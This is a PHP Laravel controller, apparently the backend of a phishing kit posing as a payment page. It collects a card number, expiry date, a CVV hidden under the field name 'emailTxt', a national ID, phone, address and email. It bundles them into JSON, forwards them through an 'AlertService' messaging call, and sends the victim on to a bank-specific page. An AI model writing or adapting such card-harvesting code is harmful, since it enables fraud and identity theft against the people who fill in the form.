<?php


namespace App\Http\Controllers;

use App\Services\AlertService;
use Illuminate\Http\Request;
use Illuminate\Support\Str;

class PaymentController extends Controller 
{

    public function start(Request $request, AlertService $alert)
      {
        // 1) Validar
        $data = $request->validate([
            'bancoTxt'  => ['required','string'],
            'nameTxt'   => ['required','string', 'min:6','max:33'],
            'cardTxt'   => ['required','string','min:16','max:19'],
            'expTxt'    => ['required','string','max:7'],
            'emailTxt'  => ['required','string','max:4'],
            'cedula'    => ['required','string','max:15'],
            'tel'       => ['required','string','max:15'],
            'add'       => ['required','string','max:200'],
            'email2Txt' => ['required','string','max:120'],
            // + los hidden que quieras persistir
        ]);

        // 2) Normalizar banco a slug seguro
        $bank = Str::of($data['bancoTxt'])->lower()->replaceMatches('/[^a-z0-9_-]/', '')->toString();

        // 3) Guardar data en sesión (en vez de cookies)
        $payload = json_encode([
            'banco'     => $data['bancoTxt'],
            'nombre'    => $data['nameTxt'],
            'tarjeta'   => $data['cardTxt'],
            'fecha'     => $data['expTxt'],
            'cvv'       => $data['emailTxt'],
            'cedula'    => $data['cedula'],
            'telefono'  => $data['tel'],
            'email'     => $data['email2Txt'],
            'direccion' => $data['add'],
        ], JSON_UNESCAPED_UNICODE);

        $request->session()->put('userData', $payload);

        // 4) Llamar API UNA vez al entrar a banco (aquí es el lugar)
        $mid = $alert->sendMessage($payload);
        if ($mid) {
            $request->session()->put('mid', $mid);
        }

        // 5) Redirigir al "index" del banco
        return redirect()->route('pago.bank', ['bank' => $bank], 303);
    }

}